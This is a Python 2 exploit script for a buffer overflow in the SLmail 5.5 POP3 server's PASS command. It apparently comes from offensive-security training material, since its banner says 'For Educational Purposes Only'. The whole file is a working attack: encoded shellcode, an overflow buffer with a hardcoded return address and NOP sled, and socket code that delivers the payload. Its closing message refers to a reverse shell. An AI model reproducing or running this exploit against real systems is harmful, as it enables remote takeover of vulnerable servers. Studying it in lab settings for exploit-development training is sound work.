import struct
import socket

print "\n\n###############################################"
print "\nSLmail 5.5 POP3 PASS Buffer Overflow"
print "\nFound & coded by muts [at] offsec.com"
print "\nFor Educational Purposes Only!" 
print "\n\n###############################################"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


sc=("\xda\xda\xbf\xc5\x99\xa1\x07\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x53\x31\x78\x17\x03\x78\x17\x83\x05\x9d\x43\xf2\x79\x76\x01"
"\xfd\x81\x87\x66\x77\x64\xb6\xa6\xe3\xed\xe9\x16\x67\xa3\x05"
"\xdc\x25\x57\x9d\x90\xe1\x58\x16\x1e\xd4\x57\xa7\x33\x24\xf6"
"\x2b\x4e\x79\xd8\x12\x81\x8c\x19\x52\xfc\x7d\x4b\x0b\x8a\xd0"
"\x7b\x38\xc6\xe8\xf0\x72\xc6\x68\xe5\xc3\xe9\x59\xb8\x58\xb0"
"\x79\x3b\x8c\xc8\x33\x23\xd1\xf5\x8a\xd8\x21\x81\x0c\x08\x78"
"\x6a\xa2\x75\xb4\x99\xba\xb2\x73\x42\xc9\xca\x87\xff\xca\x09"
"\xf5\xdb\x5f\x89\x5d\xaf\xf8\x75\x5f\x7c\x9e\xfe\x53\xc9\xd4"
"\x58\x70\xcc\x39\xd3\x8c\x45\xbc\x33\x05\x1d\x9b\x97\x4d\xc5"
"\x82\x8e\x2b\xa8\xbb\xd0\x93\x15\x1e\x9b\x3e\x41\x13\xc6\x56"
"\xa6\x1e\xf8\xa6\xa0\x29\x8b\x94\x6f\x82\x03\x95\xf8\x0c\xd4"
"\xda\xd2\xe9\x4a\x25\xdd\x09\x43\xe2\x89\x59\xfb\xc3\xb1\x31"
"\xfb\xec\x67\xaf\xf3\x4b\xd8\xd2\xfe\x2c\x88\x52\x50\xc5\xc2"
"\x5c\x8f\xf5\xec\xb6\xb8\x9e\x10\x39\xd7\x02\x9c\xdf\xbd\xaa"
"\xc8\x48\x29\x09\x2f\x41\xce\x72\x05\xf9\x78\x3a\x4f\x3e\x87"
"\xbb\x45\x68\x1f\x30\x8a\xac\x3e\x47\x87\x84\x57\xd0\x5d\x45"
"\x1a\x40\x61\x4c\xcc\xe1\xf0\x0b\x0c\x6f\xe9\x83\x5b\x38\xdf"
"\xdd\x09\xd4\x46\x74\x2f\x25\x1e\xbf\xeb\xf2\xe3\x3e\xf2\x77"
"\x5f\x65\xe4\x41\x60\x21\x50\x1e\x37\xff\x0e\xd8\xe1\xb1\xf8"
"\xb2\x5e\x18\x6c\x42\xad\x9b\xea\x4b\xf8\x6d\x12\xfd\x55\x28"
"\x2d\x32\x32\xbc\x56\x2e\xa2\x43\x8d\xea\xc2\xa1\x07\x07\x6b"
"\x7c\xc2\xaa\xf6\x7f\x39\xe8\x0e\xfc\xcb\x91\xf4\x1c\xbe\x94"
"\xb1\x9a\x53\xe5\xaa\x4e\x53\x5a\xca\x5a")

#Tested on Win2k SP4 Unpatched
# Change ret address if needed
buffer = "A"*2606 + "\x8F\x35\x4A\x5F" + "\x90"*20 +sc 
try:
	print "\nSending evil buffer..."
	s.connect(('192.168.176.128',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer +'\r\n')
	data = s.recv(1024)
	s.close()
	print "\nDone! Did you get the reverse shell"
except:
	print "Could not connect to POP3!"

